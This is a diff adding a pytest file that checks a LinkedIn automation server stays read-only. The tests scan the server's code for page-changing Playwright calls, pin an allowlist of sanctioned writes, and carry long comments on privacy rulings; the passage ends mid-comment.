@@ -1,0 +1,2337 @@
+"""The read-only invariant, checked rather than claimed.
+
+Every check here is shown FAILING on a deliberately bad sample before it is
+trusted on the real package. A check that cannot fail certifies nothing, and
+a read-only guarantee backed by a check that cannot fail is worse than no
+guarantee at all -- it manufactures confidence.
+"""
+
+from __future__ import annotations
+
+import ast
+import re
+from pathlib import Path
+
+import pytest
+
+from linkedin_server import dom, readonly
+from linkedin_server.errors import WriteAttemptError
+
+PACKAGE_DIR = Path(readonly.__file__).resolve().parent
+MODULES = sorted(PACKAGE_DIR.glob("*.py"))
+
+
+# ---------------------------------------------------------------------------
+# 1. No mutating Playwright call anywhere in the package
+# ---------------------------------------------------------------------------
+
+
+def test_there_are_modules_to_scan():
+    """Guards against a scan that passes because it found nothing to look at."""
+    assert len(MODULES) >= 9, [m.name for m in MODULES]
+
+
+@pytest.mark.parametrize("module", MODULES, ids=lambda p: p.name)
+def test_no_module_contains_an_UNSANCTIONED_mutating_call(module: Path):
+    """Every mutating call in the package is one of the ones named in advance.
+
+    THIS CHECK CHANGED SHAPE ON 2026-08-23 AND DID NOT WEAKEN. It used to assert
+    the scan came back EMPTY for every module. The package now contains exactly
+    one mutating call -- the click in ``writes.perform`` -- so an empty-scan
+    assertion could only have been kept by teaching the scanner to stop seeing
+    it, which would have destroyed the only instrument that can see the next
+    one.
+
+    So the SCAN is untouched and unconditional, and what is asserted is the
+    partition: nothing outside ``readonly.SANCTIONED_MUTATIONS``. The tests
+    below hold that list to being complete, exact, and narrow.
+    """
+    source = module.read_text(encoding="utf-8")
+    _sanctioned, unsanctioned = readonly.partition_mutation_hits(
+        f"linkedin_server/{module.name}", source
+    )
+    assert unsanctioned == [], (
+        f"{module.name} contains calls that could change state and are not "
+        f"sanctioned: {unsanctioned}. If the call is genuinely a read, waive "
+        "that single line with a trailing '# readonly-ok' so the waiver shows "
+        "up in the diff. If it is genuinely a write, it needs an entry in "
+        "readonly.SANCTIONED_MUTATIONS and the operator's say-so -- adding "
+        "one is the review moment this check exists to create."
+    )
+
+
+def test_the_sanctioned_list_is_exactly_these_calls():
+    """The allowlist, read out loud, so widening it is visible in a diff.
+
+    A guard whose allowlist is checked only for "does it cover what we found"
+    grows by one entry at a time and nobody notices. This pins the CONTENTS.
+
+    IT GREW BY ONE ON 2026-08-26, from one entry to two, which is precisely
+    the event this test exists to make visible. The second is on a READ path,
+    which is why it had to argue for itself rather than being waved through:
+
+    * ``writes.perform`` -- the write click, behind the two-call token gate;
+    * ``dom.activate_messaging_filter`` -- activates one of seven NAMED filter
+      pills on the messaging surface. All six were measured as buttons with no
+      href, so that surface is unreachable by navigation. A pill sends nothing
+      and changes nothing on LinkedIn's servers, so counted by EFFECT -- which
+      is how this family classifies everything -- a view filter is a read. And
+      ``linkedin_open_messaging`` already opens somebody's conversation and may
+      fire a read receipt: refusing the lesser act while performing the greater
+      one is backwards.
+
+    IT GREW BY ONE AGAIN ON 2026-09-01, from two to three, and this one is
+    NOT A CLICK. The previous version of this docstring ended "A THIRD click
+    fails here whatever its justification, and has to come and write one" --
+    so here it is, written.
+
+    * ``writes.perform`` -- ONE ``page.fill``, draining a queue exactly as the
+      click does. THE QUEUE IS THE DESIGN: the scanner counts CALL SITES, so
+      one drain point keeps the guarantee this list exists to give -- there is
+      one place in this package that types, and a reviewer reads it.
+
+    WHAT MAKES IT ARGUABLE RATHER THAN A WIDENING. The text is never composed
+    by this server: it is a slice of the GRANT's canonical target, the same
+    string the preview printed and the token was minted against, and
+    ``consume`` has already refused any token whose target did not match. And
+    a fill is not a publish -- typing into a composer sends nothing. The act
+    that reaches LinkedIn is the click after it, gated separately on a MEASURED
+    transition: the publish control is drawn disabled on an empty composer, so
+    a fill that worked is observable and one that did not is refused.
+
+    WHAT THE PACKAGE STOPPED BEING ABLE TO SAY. "It types nothing" was true,
+    was printed in three places, and is now false. Those places were corrected
+    in the same commit rather than left to be found.
+
+    THE COUNT IS STILL PINNED, which is the part that matters. A FIFTH entry
+    fails here whatever its justification, and has to come and write one.
+
+    FIVE FROM 2026-09-04, AND THE FIFTH IS THE FIRST THAT REACHES THE OTHER
+    WAY. The four before it act on something already on the page -- a control
+    the reader found, a string he approved, an option LinkedIn drew. Uploading
+    takes a FILE FROM THIS MACHINE and hands its bytes to a remote party, and
+    nothing in the read-only boundary was ever about that direction. It is
+    here because the operator was asked and opened it fully; see the entry's
+    own argument in ``readonly.py``, and ``tests/test_uploads.py`` for the
+    guard that bounds the path, which is where the actual risk lives.
+
+    THE NAME OF THIS TEST NO LONGER CARRIES A COUNT. It said "these three
+    calls" while asserting four, and would have said it while asserting five.
+    A name that has to be edited every time the thing it names grows is a name
+    that will eventually not be.
+
+    SEVEN FROM 2026-09-19, AND THE TWO NEW ONES ARE A PAIR ON A READ PATH.
+    They belong to ``press.disclose``: the click that opens a disclosure, and
+    the Escape that closes it. **The Escape is not decoration** -- condition 4
+    of the disclosing-press ruling is that the control is closed and the
+    closure VERIFIED, because a disclosure left open is a change to the
+    rendered state the next reader inherits. A sanction for the opening
+    without one for the closing would have made the compliant implementation
+    impossible and the non-compliant one legal, which is the wrong way round.
+
+    WHAT MAKES THEM ARGUABLE RATHER THAN A WIDENING, and it is the same
+    argument that admitted ``activate_messaging_filter`` one level up: counted
+    by EFFECT rather than by verb, a control that only renders what is already
+    there is a read. The ruling is NARROWER than that argument on its own,
+    because "discloses rather than changes" is a claim about a SPECIFIC
+    CONTROL and not a property of presses -- this package holds the
+    counterexample, in that opening the article composer may autosave a draft
+    no surface here can detect.
+
+    SO THE PERMISSION IS NOT "may press on that page". Four conjunctive
+    conditions, the first two evaluated BEFORE anything is touched: the address
+    is already admitted (a press never extends reach), the control matches an
+    enumerated ATTRIBUTE shape and never a label, the press is SHOWN not to
+    move an outward counter, and the closure is verified. Where no counter can
+    price a press, unmeasurable resolves AGAINST it.
+
+    AND THE PRESS ALLOWLIST IS A STRICT SUBSET OF THE READ ALLOWLIST --
+    `/article/new/` is admitted for reading and refused for pressing. A page
+    this server may open is not thereby a page whose controls it may activate.
+    """
+    assert readonly.SANCTIONED_MUTATIONS == (
+        ("linkedin_server/writes.py", "perform", "click"),
+        ("linkedin_server/dom.py", "activate_messaging_filter", "click"),
+        ("linkedin_server/press.py", "disclose", "click"),
+        ("linkedin_server/press.py", "disclose", "press"),
+        ("linkedin_server/writes.py", "perform", "fill"),
+        ("linkedin_server/writes.py", "perform", "select_option"),
+        ("linkedin_server/writes.py", "perform", "set_input_files"),
+    )
+    assert len(readonly.SANCTIONED_MUTATIONS) == 7
+    # THE KINDS ARE ASSERTED SEPARATELY, because the count alone would let a
+    # click be swapped for a fill without moving the number, and those are
+    # different capabilities: a click presses what is already there, a fill
+    # puts his words on a page.
+    #
+    # FOUR FROM 2026-09-02, and that one was the NARROWEST rather than the
+    # widest: a select_option cannot introduce a string at all, only choose
+    # one the page already defined.
+    #
+    # FIVE FROM 2026-09-04, and that one is the WIDEST by a distance -- which
+    # is why the argument for it is the longest of the five and why most of it
+    # is about a path rather than about a call.
+    #
+    # SEVEN FROM 2026-09-19, and one of the two new kinds is a FIRST: ``press``
+    # has never been on this list. It is the Escape that closes a disclosure,
+    # and it is the narrowest possible member of its class -- the only key it
+    # sends is a dismissal. A ``press`` that sent Enter would submit, which is
+    # why the probe rule next door splits that verb by its ARGUMENT rather than
+    # by its name, and why this entry is bound to one function that sends one
+    # key.
+    kinds = sorted(kind for _p, _f, kind in readonly.SANCTIONED_MUTATIONS)
+    assert kinds == [
+        "click",
+        "click",
+        "click",
+        "fill",
+        "press",
+        "select_option",
+        "set_input_files",
+    ], kinds
+
+
+def test_every_sanctioned_entry_is_actually_present():
+    """The other direction: a stale entry is as bad as a missing one.
+
+    An allowlist keyed on a function that no longer exists, or on a call that
+    was removed, quietly grants permission to a future edit that recreates the
+    name. Both halves are asserted, so the list cannot rot either way.
+    """
+    found: set[tuple[str, str, str]] = set()
+    for module in MODULES:
+        rel = f"linkedin_server/{module.name}"
+        source = module.read_text(encoding="utf-8")
+        for lineno, kind, _line in readonly.scan_source_for_mutations(source):
+            found.add((rel, readonly.enclosing_function(source, lineno), kind))
+    assert set(readonly.SANCTIONED_MUTATIONS) == found, (
+        "the sanctioned list and what the scanner actually finds have "
+        f"diverged. list={sorted(readonly.SANCTIONED_MUTATIONS)} "
+        f"found={sorted(found)}"
+    )
+
+
+def test_the_package_contains_exactly_as_many_mutating_calls_as_are_listed():
+    """COUNT, not just membership -- and this closes a real hole.
+
+    ``test_every_sanctioned_entry_is_actually_present`` compares SETS, so it
+    cannot see a duplicate: a SECOND click added inside ``perform`` is the same
+    ``(path, function, kind)`` triple as the first and passes a set comparison
+    unchanged. That is the hardest case, because it is in the sanctioned file,
+    in the sanctioned function, of the sanctioned kind -- and it must still
+    fail, because the list admits ONE call and not a licence.
+
+    Shown failing on exactly that edit in
+    ``test_writes.py::test_a_second_click_inside_perform_is_still_caught``.
+    """
+    total = sum(
+        len(readonly.scan_source_for_mutations(m.read_text(encoding="utf-8")))
+        for m in MODULES
+    )
+    # TWO from 2026-08-26, THREE from 2026-09-01 when one page.fill entered,
+    # FOUR from 2026-09-02 with one page.select_option, FIVE from 2026-09-04
+    # with one page.set_input_files. The equality against the allowlist LENGTH
+    # is the load-bearing half and is unchanged -- an unlisted mutating call
+    # still fails whatever its kind -- while the literal is what makes growth
+    # visible in a diff.
+    #
+    # WARNING TO THE NEXT READER, AND IT IS THE POINT OF THIS BLOCK:
+    # **THIS LINE LOOKS DERIVED AND IS NOT.** A Python chained comparison
+    # ``a == b == 5`` reads as one relation and is two: ``total == len(...)``
+    # AND ``len(...) == 5``. The first half maintains itself; the second is a
+    # HARDCODED CONSTANT wearing the first half's clothes, and it has to be
+    # hand-edited on every widening exactly like a bare literal would.
+    #
+    # It was scanned as self-maintaining twice on 2026-09-04 -- once by me and
+    # once by the lead reviewing it -- which is two out of two readers fooled
+    # by the syntax, so the defect is in how it READS rather than in anyone's
+    # care. It is kept rather than split because the constant is what makes a
+    # widening visible in a diff, and it is NAMED here so that "the count is
+    # derived, so it cannot go stale" is not concluded from the shape of the
+    # line a third time.
+    #
+    # THE SAME SYNTAX HIDES THE SAME CONSTANT ANYWHERE IT APPEARS. If a
+    # chained comparison is ever added elsewhere in this package, it inherits
+    # this paragraph and not the reassurance.
+    # SIX AND SEVEN, 2026-09-19: press.disclose's click and keyboard press,
+    # which is the disclosing-press mechanism landing. THE PARAGRAPH ABOVE
+    # PREDICTED THIS EXACT EDIT AND IT STILL WENT STALE -- the constant was
+    # not bumped when those two entries were added, so the suite went red on
+    # a literal whose own comment says it must be hand-edited on every
+    # widening. Two readers were fooled by the syntax in 2026-09-04; this time
+    # nobody misread it, it was simply not touched. **A warning that names its
+    # own failure mode does not maintain the thing it warns about** -- which
+    # is this repository's standing finding about documentation as a control,
+    # arriving on the one line written to be immune to it.
+    #
+    # The widening also moves the SHAPE the module docstring describes: seven
+    # entries across THREE files now (writes.py, dom.py, press.py), where the
+    # prose still says five. That sentence is press.py's owner to correct.
+    assert total == len(readonly.SANCTIONED_MUTATIONS) == 7, total
+
+
+def test_the_partition_conserves_every_hit():
+    """Nothing is dropped on the way through the filter.
+
+    The failure this prevents is a partition that quietly swallows a hit --
+    which would look identical to a clean package from every caller's side.
+    """
+    for module in MODULES:
+        source = module.read_text(encoding="utf-8")
+        sanctioned, unsanctioned = readonly.partition_mutation_hits(
+            f"linkedin_server/{module.name}", source
+        )
+        assert (
+            sorted(sanctioned + unsanctioned)
+            == sorted(readonly.scan_source_for_mutations(source))
+        ), module.name
+
+
+@pytest.mark.parametrize(
+    "label, path, source",
+    [
+        # The sanctioned call, but in the wrong FILE.
+        (
+            "wrong file",
+            "linkedin_server/dom.py",
+            "async def perform(page, grant):\n    await page.click('b')\n",
+        ),
+        # The sanctioned file and kind, but the wrong FUNCTION.
+        (
+            "wrong function",
+            "linkedin_server/writes.py",
+            "async def _helper(page, grant):\n    await page.click('b')\n",
+        ),
+        # The sanctioned file and function, but the wrong KIND.
+        #
+        # THIS CASE USED page.fill UNTIL 2026-09-01, when fill inside
+        # perform became sanctioned. It is RE-AIMED rather than deleted:
+        # the property under test is that the KIND half of the triple
+        # discriminates at all, and dropping the case because its example
+        # got promoted would remove the only proof of that half.
+        # page.type is what a future edit reaches for once typing is
+        # permitted in principle, which makes it the right example now.
+        (
+            "wrong kind",
+            "linkedin_server/writes.py",
+            "async def perform(page, grant):\n    await page.type('#n', 'x')\n",
+        ),
+        # A SECOND WRONG KIND, same day. Two of them, because the entry
+        # that arrived buys exactly fill -- and press and keyboard are the
+        # two verbs that would let somebody type without calling it typing.
+        (
+            "wrong kind, keyboard",
+            "linkedin_server/writes.py",
+            "async def perform(page, grant):\n    await page.press('#n', 'a')\n",
+        ),
+        # The sanctioned triple in every respect EXCEPT that the call is
+        # buried one scope down. Attribution is innermost, so the closure is
+        # named as itself and inherits nothing.
+        (
+            "nested inside the sanctioned function",
+            "linkedin_server/writes.py",
+            "async def perform(page, grant):\n"
+            "    async def _go():\n"
+            "        await page.click('b')\n"
+            "    return _go\n",
+        ),
+        # Module level, inside the sanctioned file. No enclosing function at
+        # all, so nothing to match.
+        (
+            "module level",
+            "linkedin_server/writes.py",
+            "page.click('b')\n",
+        ),
+    ],
+)
+def test_the_exception_does_not_widen(label, path, source):
+    """SHOWN FAILING on the five ways this exemption could be stretched.
+
+    Each of these is one edit away from the real entry, and every one of them
+    has to come back UNSANCTIONED. Without this the triple could be reduced to
+    "a click somewhere in writes.py" and no test would notice.
+    """
+    sanctioned, unsanctioned = readonly.partition_mutation_hits(path, source)
+    assert sanctioned == [], (label, sanctioned)
+    assert unsanctioned, (label, "the scanner did not even see it")
+
+
+def test_the_real_entry_IS_admitted():
+    """THE POSITIVE CONTROL for all five refusals above.
+
+    Five tests asserting "not sanctioned" pass perfectly on a partition that
+    sanctions nothing at all. This is the one that would fail if it did.
+    """
+    source = "async def perform(page, grant):\n    await page.click('b')\n"
+    sanctioned, unsanctioned = readonly.partition_mutation_hits(
+        "linkedin_server/writes.py", source
+    )
+    assert len(sanctioned) == 1, sanctioned
+    assert unsanctioned == []
+
+
+@pytest.mark.parametrize(
+    "spelling",
+    [
+        "linkedin_server/writes.py",
+        "linkedin_server\\writes.py",
+        "./linkedin_server/writes.py",
+    ],
+)
+def test_the_path_is_matched_in_every_spelling_a_checkout_produces(spelling):
+    """Windows separators and a leading ./ must not silently un-sanction it.
+
+    Three CI cells, two of them posix and one Windows. A path comparison that
+    worked on one and not the others would turn this check into a test that
+    passes for the wrong reason on two thirds of the matrix.
+    """
+    source = "async def perform(page, grant):\n    await page.click('b')\n"
+    sanctioned, _ = readonly.partition_mutation_hits(spelling, source)
+    assert len(sanctioned) == 1, spelling
+
+
+def test_the_mutation_scanner_catches_a_planted_write():
+    """The scanner, shown failing. Without this the check above proves nothing."""
+    bad = (
+        "async def apply(page):\n"
+        "    await page.click('#easy-apply')\n"
+        "    await page.fill('#note', 'hire me')\n"
+        "    await page.request.post('https://www.linkedin.com/voyager/api/x')\n"
+    )
+    hits = readonly.scan_source_for_mutations(bad)
+    kinds = {kind for _, kind, _ in hits}
+    assert {"click", "fill", "http_post"} <= kinds, hits
+
+
+def test_exactly_one_place_in_this_package_can_reach_a_file_input():
+    """THE QUESTION THIS TEST CARRIED FOR THREE DAYS HAS BEEN ANSWERED.
+
+    It was called ``test_nothing_in_this_package_can_reach_a_file_input`` and
+    it closed with the sentence that made it a question rather than a rule:
+
+        UPLOADING IS A DIFFERENT CAPABILITY FROM TYPING. A fill puts his words
+        in a box; a file input puts a FILE from this machine into somebody
+        else's inbox, chosen by a path string. Nothing in this package should
+        be one edit away from that, AND THE OPERATOR HAS NEVER BEEN ASKED
+        ABOUT IT.
+
+    He was asked on 2026-09-04 and opened it FULLY -- profile photo, post
+    media and message attachments. So the assertion is reversed, deliberately
+    and by name, because that is how a written question is supposed to end:
+    the file that recorded it is the file that records the answer, and a
+    reader who finds the old sentence in the history can see exactly what
+    changed and on whose say-so.
+
+    WHAT IS STILL MEASURED, and it is the same measurement. MEASURED
+    2026-09-01 on /messaging/compose/: ``file_inputs: 2``, named ``Attach a
+    file for your draft conversation`` and ``Attach an image for your draft
+    conversation``, both in ``form#0``. They sit on a surface this server
+    loads, beside a Send control it can press. That was the reason to ask; it
+    is not a reason to refuse now that he has answered.
+
+    WHAT THIS TEST ASSERTS NOW -- and it is strictly more than the old one,
+    not less:
+
+    * ONE place in the package reaches a file input, and it is
+      ``writes.perform``. The old test said "none"; the weaker claim would be
+      "at least the sanctioned one", and that is NOT what is asserted. A
+      second one anywhere, in any module, fails here by name.
+    * The pattern still bites, so the sweep is not a sweep over nothing.
+    * The kind IS on the allowlist, exactly once -- the literal inverse of the
+      line this test used to end on.
+
+    AND THE SANCTION IS NOT WHERE THE SAFETY LIVES. What makes a file input
+    safe to reach is not this list; it is ``linkedin_server/uploads.py`` --
+    the declared root, the link refusal, the regular-file check and the digest
+    -- exercised in ``tests/test_uploads.py``. This test polices the WIDTH of
+    the opening. That one polices what comes through it.
+    """
+    found: list[tuple[str, int, str]] = []
+    for module in MODULES:
+        source = module.read_text(encoding="utf-8")
+        for lineno, kind, line in readonly.scan_source_for_mutations(source):
+            if kind == "set_input_files":
+                found.append((module.name, lineno, line))
+                assert readonly.enclosing_function(source, lineno) == "perform", (
+                    module.name,
+                    lineno,
+                    line,
+                )
+                assert module.name == "writes.py", (module.name, lineno, line)
+    assert len(found) == 1, found
+
+    # AND THE PATTERN ITSELF MUST STILL BITE, or the loop above is a loop over
+    # nothing. A rule that cannot fire certifies nothing.
+    planted = (
+        "async def send(page):\n"
+        "    await page.set_input_files('#f', p)\n"
+    )
+    hits = readonly.scan_source_for_mutations(planted)
+    assert [kind for _line, kind, _src in hits] == ["set_input_files"], hits
+
+    # IT IS ON THE ALLOWLIST NOW, AND EXACTLY ONCE. This line asserted the
+    # opposite until 2026-09-04. The count matters as much as the membership:
+    # the triple is (path, function, kind), so a SECOND entry would have to
+    # name a second file or a second function, and either is a widening that
+    # has to come here and argue.
+    uploads_sanctioned = [
+        entry
+        for entry in readonly.SANCTIONED_MUTATIONS
+        if entry[2] == "set_input_files"
+    ]
+    assert uploads_sanctioned == [
+        ("linkedin_server/writes.py", "perform", "set_input_files")
+    ], uploads_sanctioned
+
+
+def test_evaluate_is_flagged_unless_explicitly_waived():
+    """An unwaived evaluate() must trip the scanner; a waived one must not."""
+    unwaived = "result = await page.evaluate(SOME_SCRIPT)\n"
+    assert readonly.scan_source_for_mutations(unwaived)
+
+    waived = "result = await page.evaluate(SOME_SCRIPT)  # readonly-ok\n"
+    assert readonly.scan_source_for_mutations(waived) == []
+
+
+def test_only_dom_module_waives_evaluate():
+    """The waiver is a narrow allowance, not a habit spreading through the code."""
+    waived_in: dict[str, int] = {}
+    for module in MODULES:
+        count = sum(
+            1
+            for line in module.read_text(encoding="utf-8").splitlines()
+            if line.strip().endswith("# readonly-ok")
+        )
+        if count:
+            waived_in[module.name] = count
+    assert set(waived_in) <= {"dom.py"}, waived_in
+    # SIX FROM 2026-08-30, up from four. The budget is what stops an
+    # evaluate() waiver spreading: every one of them is a place where "we
+    # only call read methods in Python" stops being a sufficient argument,
+    # so the number is pinned and a new one has to move it in a reviewable
+    # diff. The fourth is CENSUS_JS, read by dom.read_surface_census.
+    #
+    # THE FIFTH AND SIXTH were added to diagnose a tracker read returning zero
+    # rows from a page carrying four job-row anchors, eight times out of eight.
+    # dom.harvest_census re-runs HARVEST_LINKED_CARDS_JS under a flag -- the
+    # SAME script, so the diagnostic cannot drift from the walk it describes --
+    # and dom.read_tracker_row_shape runs TRACKER_ROW_SHAPE_JS, which reports
+    # tag names and character counts and no text at all.
+    #
+    # A THIRD WAS PROPOSED AND NOT SPENT: main's textContent length is read
+    # through locator.text_content(), Playwright's own API, because a waiver
+    # that a plain call replaces is a waiver nobody should be asked to review.
+    #
+    # SEVEN FROM 2026-08-31, and this is the first waiver on this list spent to
+    # buy a PRIVACY guarantee rather than a reading. INVITE_NEEDLE_JS, run by
+    # dom.read_invitation_surface.
+    #
+    # The other six count controls, and every one of them could in principle
+    # have been a locator chain -- which is the test the paragraph above
+    # applies, and it is why the third was refused. THIS ONE FAILS THAT TEST IN
+    # THE OTHER DIRECTION. It has to COMPARE an aria-label against a needle,
+    # and on this surface the label IS A THIRD PARTY'S NAME. A locator chain
+    # doing that comparison in Python would have to fetch the label into this
+    # process first, and the operator's 2026-08-31 ruling on invitation
+    # targeting is that this server may RECEIVE one identity per call and must
+    # not persist it -- no identity in any file, log, cache or audit. A name
+    # that reaches Python can reach a traceback, an exception message, a cache
+    # key or an audit line, and no care downstream un-rings that.
+    #
+    # So the waiver is what makes "never stored" ENFORCEABLE rather than
+    # promised: the comparison happens in the page and the script returns three
+    # numbers -- total, matches, index -- and no label, no name, and no
+    # fragment of either. The cheap side of the usual trade is the unacceptable
+    # one here, which is the argument, and it is the only reason this number
+    # moved.
+    #
+    # EIGHT FROM 2026-08-31, and it is the SECOND waiver spent on privacy
+    # rather than on a reading -- EDITOR_FIELDS_JS, run by
+    # dom.read_self_owned_editor_fields. It is the inverse of the seventh: that
+    # one keeps a name OUT of this process, this one lets a name IN, and both
+    # need the work done in the page for the same structural reason.
+    #
+    # WHY A LOCATOR CHAIN CANNOT BUY IT. The read is "every control inside the
+    # nearest dialog ancestor of the one control named Save". Playwright can
+    # find descendants of a known element and it cannot walk UP from one --
+    # there is no locator for closest(). Doing it in Python would mean
+    # enumerating every dialog on the page, reading each one's controls, and
+    # deciding containment from the two lists, which is the adjacency-guessing
+    # that the container measurement was taken to end. And the counting rule
+    # this reader lives by -- exactly one anchor or it refuses -- has to be
+    # decided over the whole document at one instant, not across a series of
+    # separate locator calls against a page that is still settling.
+    #
+    # NINE FROM 2026-08-31, and it is the second waiver on this list spent
+    # to buy a PRIVACY guarantee. ACTIVITY_ITEMS_JS, run by
+    # dom.read_own_activity_items, compares an author string against the
+    # page's own h1 and returns a BOOLEAN. A locator chain doing that
+    # comparison in Python would have to fetch both strings into this
+    # process, which is the one thing the ruling on that reader forbids --
+    # so it fails the cheap-alternative test in the same direction
+    # INVITE_NEEDLE_JS does, and for the same reason.
+    # TEN FROM 2026-09-01, up from nine. The tenth is SDUI_ACTIONS_JS, and it
+    # is the one waiver that exists to make a RULING measurable rather than to
+    # read a page: the operator ruled that a click issuing no `ServerRequest`
+    # is by effect a read, so something has to count them, and the counting
+    # can only happen inside the page. It returns INTEGERS -- the profile's
+    # flight payload is ~1.09 MB and is where his identity lives, which is why
+    # the sanitised fixtures here carry zero script characters.
+    # ELEVEN FROM 2026-09-01, and this one is spent on a PRIVACY GUARANTEE
+    # for the third time -- EDITOR_VALUES_JS, run by
+    # dom.read_self_owned_editor_values. It reads the editor container's
+    # VALUES, which is the widest thing this package publishes, and three
+    # kinds of control have their value withheld INSIDE THE PAGE: a file
+    # input (a path on his disk), a password input (a secret), and a checkbox
+    # or radio (whose value attribute is a submission token, not the state).
+    #
+    # WHY A LOCATOR CHAIN CANNOT BUY IT, and it is the same argument that
+    # bought the eighth plus one more. The containment read is still
+    # "everything inside the nearest dialog ancestor of the one control named
+    # Save", and Playwright has no locator for closest(). The additional
+    # reason is the withholding: a locator chain reading input_value() decides
+    # what to keep AFTER the string has crossed into this process, and a
+    # value that reaches this process can reach a traceback or a log line. The
+    # whole point of doing it in the page is that the withheld strings never
+    # exist here at all.
+    #
+    # WHY IT IS A SECOND SCRIPT rather than a flag on EDITOR_FIELDS_JS, which
+    # would have cost no waiver: EDITOR_FIELDS_JS is guarded by an
+    # UNCONDITIONAL assertion that it contains no value read, and a cfg flag
+    # would turn that into a claim about a branch. A waiver is the cheaper
+    # thing to spend than that guard.
+    # TWELVE FROM 2026-09-02, and it is the FOURTH spent on a privacy
+    # guarantee -- COMPOSE_MODES_JS, run by dom.read_compose_modes. It reads
+    # the message composer's two dispatch radios, whose labels are measured to
+    # be "<him> will send message" and "<him> to <a company> will send
+    # message". The labels ARE his name.
+    #
+    # WHY A LOCATOR CHAIN CANNOT BUY IT, and it is the seventh's argument
+    # exactly. The work is: resolve each radio's accessible name, count the
+    # capitalised runs in it, and return the counts and the name-free tail. A
+    # locator chain would fetch the label into this process and decide
+    # afterwards -- and a string that reaches this process can reach a
+    # traceback, a log line or a cache key. The whole point of doing it in the
+    # page is that the label never exists here at all.
+    #
+    # WHY IT IS A SECOND SCRIPT rather than a flag on EDITOR_FIELDS_JS. Two
+    # reasons, and the second is the one that decided it.
+    #
+    # REACH: the eighth is anchor-then-closest(containerSelector), and the
+    # dispatch radios have NO container ancestor -- measured twice,
+    # containers {"none": 1}. No value of any parameter it already takes
+    # reaches them, so it would need a document-wide mode: a select-anywhere
+    # path inside the script whose entire safety story is "the container IS
+    # the permission", which the profile editor also runs. The census measured
+    # what is on that page while this was decided: twenty-two controls naming
+    # people, with zero recipients selected.
+    #
+    # AND THE DECIDING ONE: the eighth returns accessible names UNGATED. That
+    # is correct for a container measured to be his own, and it is why it is
+    # described above as the seventh's inverse. On THIS surface the names are
+    # his, so riding that script means shape.looks_name_shaped is the only
+    # thing between his name and the output -- and that predicate failed OPEN
+    # on this exact label until 2026-09-02. A flag would also make the
+    # eighth's containment story conditional, which is the same objection that
+    # bought the eleventh.
+    #
+    # A correct guard is one regex edit from being an incorrect guard. This
+    # waiver buys the label never being in the process to guard.
+    #
+    # THE THIRTEENTH, 2026-09-02: ``SELECTED_RECIPIENT_JS``, and the argument
+    # for it is the twelfth's carried one surface further. The twelfth shapes
+    # a label known to be HIS. This one runs where a committed recipient is by
+    # definition A THIRD PARTY, so every label it touches names somebody who
+    # is not him -- and it returns INTEGERS ONLY: counts per candidate
+    # selector, a de-duplicated total, and how many carry the needle the
+    # caller supplied. The needle comparison happens in the page for the
+    # reason ``INVITE_NEEDLE_JS`` does the same, and there is no
+    # ``revealSingleMatch`` escape: that flag lets a PREVIEW show him who he
+    # would reach, and this runs inside ``perform``, after he has confirmed,
+    # where there is nothing left to show and therefore no reason for a name
+    # to exist in this process.
+    #
+    # WHY NOT RIDE AN EXISTING SCRIPT. ``read_compose_fields`` counts selected
+    # recipients through ``page.locator``, which needs no waiver -- and that
+    # is exactly the route whose selector has never matched anything and whose
+    # only test discards the selector argument. A count that cannot say WHICH
+    # candidate matched, and cannot compare a label without pulling it into
+    # this process, is not the reading a send gate needs.
+    #
+    # THE FOURTEENTH, 2026-09-03: ``RECIPIENT_IDS_JS``, and unlike the
+    # ``wait_for_selector`` waiver that was REMOVED from this count the same
+    # day, this one is necessary -- ``page.evaluate`` is on
+    # ``_MUTATION_CALL_PATTERNS`` and ``wait_for_selector`` is not. The
+    # difference is the whole reason the count is pinned rather than trusted:
+    # an unnecessary waiver moved this number once already and was caught by
+    # it.
+    #
+    # WHAT IT INJECTS: a read that climbs from a Message button to the row
+    # that holds it, so a member id already drawn on a page this server opens
+    # stops being discarded. It writes nothing and returns ids to a caller.
+    #
+    # THE FIFTEENTH AND SIXTEENTH, 2026-09-03: ``JOB_INSIGHT_MARKERS_JS`` and
+    # ``PROFILE_VIEWS_INSIGHTS_JS``. Two waivers in one change, which is why
+    # the argument is made once for both and then separately for each.
+    #
+    # WHAT THEY ARE FOR. Both read a page a tool has ALREADY loaded for
+    # another reason and take what was being thrown away -- the Premium
+    # insight panels on a job posting, and the headline count, the change
+    # against the prior period, the trend chart and the filters on the
+    # profile-views page. Neither navigates, neither clicks, and neither adds
+    # a page load anywhere.
+    #
+    # WHY NOT RIDE AN EXISTING SCRIPT, asked seriously because these are the
+    # two cheapest waivers on this list to have refused. ``READ_PROFILE_JS``
+    # does carry the job panels -- it walks ``main``'s headings, and
+    # ``read_job_insight_panels`` uses it for exactly that, which is why only
+    # ONE waiver is spent on the posting rather than two. What it cannot
+    # answer is whether an element carries ``aria-label="Verified job"``,
+    # which is an attribute and not a heading. On the profile-views page it
+    # answers nothing at all: that page has NO h1, h2 or h3 anywhere, so the
+    # heading walker returns two sections of advertising furniture and none of
+    # the aggregates.
+    #
+    # THE FIFTEENTH IS THE LEAST-PUBLISHING SCRIPT ON THIS LIST. It runs on a
+    # posting, whose DOM holds a hiring team and a "people also viewed" rail,
+    # and it returns data-view-name attribute values, three booleans and a
+    # character count. No accessible name, no text, no href; the two furniture
+    # strings it tests for are compared inside the page and only a boolean
+    # crosses.
+    #
+    # THE SIXTEENTH RUNS WHERE THE ARGUMENT IS SHARPEST -- a page that IS a
+    # list of other members, whose aria-labels name them. It is shaped by
+    # subtraction: paragraph pairs whose first is a bare number, the <label>
+    # text inside a filter control, the chart's own one-sentence description,
+    # and COUNTS of view names. It reads no aria-label at all and takes no
+    # text from inside a viewer row. That shape was chosen because the
+    # alternative was MEASURED: a probe the same day pointed the surface
+    # census at this page, hand-rolled its own tally, and published thirteen
+    # real names -- the singleton blanking that would have caught them runs at
+    # publish time in ``shape.census_aggregate``, not in the reader.
+    #
+    # THE SEVENTEENTH, 2026-09-05: ``SEARCH_APPEARANCES_JS``, run once from
+    # ``dom.read_search_appearances``. It is the SIXTEENTH's page one door
+    # along -- his own search-appearances analytics, the reciprocal instrument
+    # for a search the way profile-views is the reciprocal for a profile load.
+    #
+    # WHY IT DOES NOT RIDE THE SIXTEENTH, asked because they read sibling
+    # pages and the temptation is a flag. ``PROFILE_VIEWS_INSIGHTS_JS``
+    # publishes any of six numberish paragraph pairs verbatim, and that is
+    # SAFE ON ITS PAGE because that page draws exactly two. This page is
+    # expected to draw breakdown panels about the SEARCHERS in the identical
+    # shape -- ``<p>12</p><p>Acme Corp</p>`` -- so the same rule would publish
+    # a third party's employer. A flag that changes what a script may emit is
